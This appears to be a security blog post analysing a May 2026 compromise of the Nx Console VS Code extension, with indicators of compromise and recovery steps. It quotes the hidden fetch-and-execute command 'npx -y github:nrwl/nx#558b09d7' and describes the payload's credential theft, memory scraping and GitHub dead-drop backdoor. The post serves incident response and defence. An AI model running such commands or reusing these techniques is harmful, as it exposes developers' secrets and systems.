---
layout: post
title: "Your IDE Just Got Pwned: The Nx Console Supply Chain Attack"
date: 2026-05-22 05:26:18 UTC
category: devsecops
tags:
  - supply-chain-attack
  - vscode-extension
  - nx-console
  - github-security
  - GHSA
subtitle: "Secure your Dev"
description: "Nx Console v18.95.0 was compromised via a stolen GitHub token on May 18, 2026. Learn what the payload did, IoCs to check, and how to fully recover"
image: https://images.unsplash.com/photo-1490814525860-594e82bfd34a?q=80&w=1495&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
optimized_image: https://images.unsplash.com/photo-1490814525860-594e82bfd34a?q=80&w=1495&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
image_position: "50% 50%"
author: Shubhendu Shubham
---

Your IDE is now part of your attack surface. The Nx Console breach on May 18, 2026 proves it.

## What Happened — and Why It's Worse Than a Typical Extension Compromise

Most extension compromises are sloppy — a typosquat, a stolen package name, a rogue maintainer who pushes a coin miner. This wasn't that.

On May 18, 2026, version `18.95.0` of the Nx Console VS Code extension (`nrwl.angular-console`) was published to the Visual Studio Code Marketplace with malicious code baked in. The extension has over **2.2 million installs**. The compromised version was live for exactly **11 minutes** — between 12:36 and 12:47 UTC (2:36–2:47 PM CEST) — before the Nx team yanked it.

According to the official Nx security advisory GHSA-c9j4-9m59-847w, anyone who had VS Code running with Nx Console and auto-update enabled during that window should assume they were compromised.
[NX Security GH](https://github.com/nrwl/nx-console/security/advisories/GHSA-c9j4-9m59-847w)

Eleven minutes sounds short. But auto-update is on by default. VS Code silently updates extensions in the background. If your editor was open and you opened any workspace, the payload ran — and you may not have noticed anything.

The root cause, per the official advisory, was a supply chain attack that scraped a contributor's GitHub token. That stolen token was then used to publish a tampered version of the extension directly to the VS Code Marketplace using legitimate publisher credentials.

## How the Attack Chain Actually Worked

The mechanics here are genuinely sophisticated, and understanding them matters if you're doing threat modelling or incident response right now.

### Step 1: A Contributor's GitHub Token Was Stolen

The Nx team confirmed the attack occurred due to a recent supply chain attack that scraped one of their contributor's GitHub tokens. The specific prior attack hasn't been publicly named. But the stolen token had enough privileges to publish to the VS Code Marketplace using a `VSCE_PAT` credential tied to that account.

This is the part that doesn't get talked about enough: **the attacker didn't break GitHub or the VS Code Marketplace**. They walked in through the front door using a legitimate credential stolen from a developer who was themselves a victim of a separate supply chain incident.

### Step 2: A Hidden Commit Planted in the Official nrwl/nx Repository

Before the malicious extension was published, the attacker used the stolen token to push an **orphan commit** to the `nrwl/nx` repository — a commit with no parent, unreachable from any branch. The commit SHA `558b09d7` replaces the entire Nx monorepo tree with just two files: a `package.json` and a 498 KB obfuscated `index.js` payload.

You can't find this by browsing GitHub. It's only fetchable if you already know the commit SHA. The injected extension code knew exactly that SHA.

The commit was attributed to a former Nx contributor's account, and the commit message read like a threat: *"Don't delete this commit before 24 hours or wiper activates."* Social engineering baked right into the Git object, designed to make anyone who found it hesitate before cleaning it up.

### Step 3: Malicious Extension Published to the Marketplace

At 12:36 UTC, the attacker published `nrwl.angular-console` v18.95.0. The extension contained 2,777 bytes of malicious code injected into the minified `main.js` at byte offset 7,703,700.

The injected code ran from the extension's `activate()` function — the first thing VS Code calls when the extension loads. It checked a `globalState` key, and if the stored SHA didn't match the orphan commit, it silently spun up a hidden VS Code Task to fetch and execute the orphan commit's payload via:

```bash
# What the injected code ran silently in the background
npx -y github:nrwl/nx#558b09d7
```

The `-y` flag skips confirmation. The task's terminal was hidden from the user. If it ran successfully, the SHA was stored in `globalState` so it wouldn't re-trigger on the next workspace open.

## What the Payload Actually Did

This is where things get serious for incident responders. This isn't a simple stealer.

The payload is a multi-stage credential harvesting tool that exfiltrates secrets over three independent channels: HTTPS, the GitHub API, and DNS tunneling. If one channel is blocked, the others take over.

### Credential Targets

The payload ran six specialized collector classes in parallel, targeting: HashiCorp Vault tokens (including Kubernetes and AWS IAM auth methods), npm OIDC tokens, AWS credentials via IMDS and ECS metadata endpoints, GitHub tokens matching `ghp_`, `gho_`, and `ghs_` patterns, 1Password via the `op` CLI, and filesystem secrets including `.env` files, SSH private keys, and AWS credential files.

One collector specifically targeted `~/.claude/settings.json` — Claude Code configuration files. That's the first time I've seen a supply chain payload deliberately go after AI coding assistant credentials.

On Linux systems, the payload attempted to read `/proc/*/mem` to pattern-match secrets directly from running process memory, bypassing any application-level secret masking. Environment variables in your terminal sessions, secrets your IDE loaded at startup, tokens held by running dev servers — all in scope.

### The Sigstore Problem

This is the detail that should worry every package maintainer. The payload includes full Sigstore integration — endpoints for Fulcio certificate issuance, Rekor transparency log submission, and SLSA provenance generation.

Combined with stolen npm OIDC tokens, the attacker could publish downstream npm packages with **cryptographically valid provenance attestations**. Packages that would pass `npm audit signatures`. Packages that look like legitimate, verified builds to every automated scanner downstream.

### Persistent Python Backdoor

The payload drops a Python C2 backdoor to `~/.local/share/kitty/cat.py` and registers a macOS LaunchAgent at `~/Library/LaunchAgents/com.user.kitty-monitor.plist` with `RunAtLoad=true` and an hourly polling interval.

The backdoor uses the GitHub Search API as a dead-drop. Every hour it polls:

```
GET api.github.com/search/commits?q=firedalazer&sort=committer-date&order=desc&per_page=1
```

It parses the latest matching commit message for a base64-encoded URL and a signature. Commands are verified against an embedded 4096-bit RSA public key using RSA-PSS before execution. Only whoever holds the corresponding private key can issue commands. And GitHub API traffic to `api.github.com` is exactly the kind of thing most corporate firewalls pass without blinking.

## Are You Affected?

If you had VS Code running with Nx Console and auto-update enabled between 2:36 PM and 2:47 PM CEST on May 18, 2026, and you opened a workspace during or after that window, assume you were compromised.

Check your installed version:

```bash
# Check which version of Nx Console is installed
code --list-extensions --show-versions | grep angular-console
```

If the output shows `18.95.0`, you were affected. Also look for persistence artifacts:

```bash
# Check for the Python C2 backdoor
ls -la ~/.local/share/kitty/cat.py

# macOS only: check for the LaunchAgent
ls -la ~/Library/LaunchAgents/com.user.kitty-monitor.plist

# Check for anti-replay state file
ls -la /var/tmp/.gh_update_state

# Check for staging directories
ls -d /tmp/kitty-* 2>/dev/null
```

Finding none of these doesn't mean the credential theft phase didn't run. In at least three confirmed cases, the Python backdoor failed to install because the `requests` module wasn't available — but the JavaScript credential collector ran to completion before the Python stage. Assume credential exfiltration happened even if the persistence artifacts are absent.

## Indicators of Compromise

| Category | Indicator |
|---|---|
| Extension version | `nrwl.angular-console` exactly `18.95.0` |
| Malicious VSIX SHA-256 | `1a4afce34918bdc74ae3f31edaffffaa0ee074d83618f53edfd88137927340b8` |
| Orphan commit | `558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2` in `nrwl/nx` |
| Python backdoor | `~/.local/share/kitty/cat.py` |
| macOS persistence | `~/Library/LaunchAgents/com.user.kitty-monitor.plist` |
| C2 dead-drop | `api.github.com/search/commits?q=firedalazer` |
| AWS IMDS probe | `169.254.169.254` (IMDS), `169.254.170.2` (ECS) |
| Process env flag | `__DAEMONIZED=1` on running Node/Bun processes |
| Vault local endpoint | `127.0.0.1:8200` |
| Sigstore endpoints | `fulcio.sigstore.dev`, `rekor.sigstore.dev` |

## What to Do Right Now

### 1. Update Immediately

Nx Console version 18.100.0 is the patched release. Update to this or later in VS Code and any other VS Code-based editor you use (Cursor, Windsurf, etc.).

```bash
# Force update via CLI
code --install-extension nrwl.angular-console --force
```

### 2. Kill Orphaned Processes

```bash
# Kill any daemon processes the payload may have left running
pkill -f "__DAEMONIZED"
pkill -f "kitty-"
pkill -f "cat.py"
```

### 3. Remove Persistence

```bash
# Remove Python backdoor and macOS LaunchAgent
rm -f ~/.local/share/kitty/cat.py
rm -f ~/Library/LaunchAgents/com.user.kitty-monitor.plist
launchctl unload ~/Library/LaunchAgents/com.user.kitty-monitor.plist 2>/dev/null
rm -rf /tmp/kitty-*
rm -f /var/tmp/.gh_update_state
```

### 4. Audit Sudoers (Linux)

The payload attempted privilege escalation on Linux if passwordless sudo was available:

```bash
# Check for unauthorized NOPASSWD entries
sudo grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/
sudo ls -la /etc/sudoers.d/
```

Remove anything you don't recognize.

### 5. Rotate Everything

The official advisory is unambiguous: assume anything on disk needs to be rotated. This includes tokens, secrets, and SSH keys.

Don't triage. Don't try to figure out which secrets were "definitely accessed." The payload reached into process memory, cloud metadata services, password manager CLIs, and remote secret stores. The rotation scope should be:

- GitHub PATs and SSH keys (`~/.ssh/`, `~/.gitconfig`, `~/.config/gh/`)
- npm tokens (`~/.npmrc`) — and review publish history for every package you maintain
- AWS credentials (`~/.aws/credentials`) — and check CloudTrail for `GetSecretValue`, `AssumeRole`, `GetParameter` events
- HashiCorp Vault tokens (`~/.vault-token`) — pull audit device logs for the compromise window
- 1Password vault items accessible via `op` CLI — review item access history
- GitHub Actions secrets at repo and org level
- Any `.env` files across your projects
- Claude Code API key and MCP server credentials (`~/.claude/settings.json`)

### 6. Audit Your Repos

If the compromised account had push access to any repositories you share, check for unexpected commits, workflow modifications under `.github/workflows/`, and force pushes. The attacker held a valid token with write access and the Sigstore capability to sign npm packages with valid provenance. Don't assume clean until you've verified.

## The Bigger Picture: Your IDE Is Part of Your Threat Model

The Nx Console incident fits a pattern that's been accelerating. This is the second supply chain attack against the Nx ecosystem in under a year. The first targeted npm packages directly. This one pivoted to the VS Code extension marketplace.

Extensions run with full access to your filesystem, your environment variables, your terminal, your cloud credentials. They're not sandboxed in any meaningful way. And VS Code's auto-update means you can acquire a malicious extension without ever clicking "update."

The Nx team has hardened their publishing pipeline in response — they now require two admins to approve any new VS Code extension release. Previously, any core contributor could release directly. That's the right call. But the broader lesson is that every open-source extension in your editor has a publishing pipeline, and the security of that pipeline is entirely outside your control.

Things worth doing now regardless of whether you were affected:

- Audit which VS Code extensions you have installed and remove anything you don't actively use
- Disable auto-update for extensions and update manually after checking changelogs
- Treat your developer machine as a sensitive endpoint, not a sandboxed development environment
- If you run a team: include IDE extension versions in your device posture checks the same way you'd check OS patch levels

## Quick Reference

| Action | Command |
|---|---|
| Check installed version | `code --list-extensions --show-versions \| grep angular-console` |
| Update to safe version | `code --install-extension nrwl.angular-console --force` |
| Kill daemon processes | `pkill -f "__DAEMONIZED"; pkill -f "kitty-"; pkill -f "cat.py"` |
| Remove Python backdoor | `rm -f ~/.local/share/kitty/cat.py` |
| Remove macOS persistence | `rm -f ~/Library/LaunchAgents/com.user.kitty-monitor.plist` |
| Unload LaunchAgent | `launchctl unload ~/Library/LaunchAgents/com.user.kitty-monitor.plist` |
| Check sudoers | `sudo grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/` |
| Scan for orphan npm cache | `ls ~/.npm/_npx/ \| grep 558b09d7` |

The safe version is **18.100.0**. If you're on anything earlier and VS Code was open on May 18 between 12:36–12:47 UTC, rotate your credentials and treat the machine as compromised until you've verified otherwise.

**Official References:**
- [GHSA-c9j4-9m59-847w — Compromised Nx Console version 18.95.0](https://github.com/nrwl/nx-console/security/advisories/GHSA-c9j4-9m59-847w)
- [GitHub Issue #3139](https://github.com/nrwl/nx-console/issues/3139)